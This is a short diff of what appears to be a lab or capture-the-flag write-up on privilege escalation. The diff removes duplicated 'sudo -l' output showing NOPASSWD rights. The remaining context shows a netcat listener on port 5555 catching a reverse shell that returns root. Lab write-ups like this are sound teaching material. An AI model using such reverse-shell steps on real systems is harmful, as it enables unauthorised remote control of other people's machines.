@@ -605,22 +605,6 @@ www-data@Artig:~/html$ exit
 4. My kali is listening on port 5555 and automatically gets the shell
 
 ```bash
-max@Artig:/var/www/html$ sudo -l
-Matching Defaults entries for max on Artig:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
-
-User max may run the following commands on Artig:
-    (www-data) NOPASSWD: /bin/bash
-max@Artig:/var/www/html$ sudo -l
-Matching Defaults entries for max on Artig:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
-
-User max may run the following commands on Artig:
-    (www-data) NOPASSWD: /bin/bash
-    (ALL : ALL) NOPASSWD: ALL
-```
-
-```bash
 nc -lvnp 5555
 whoami
 root
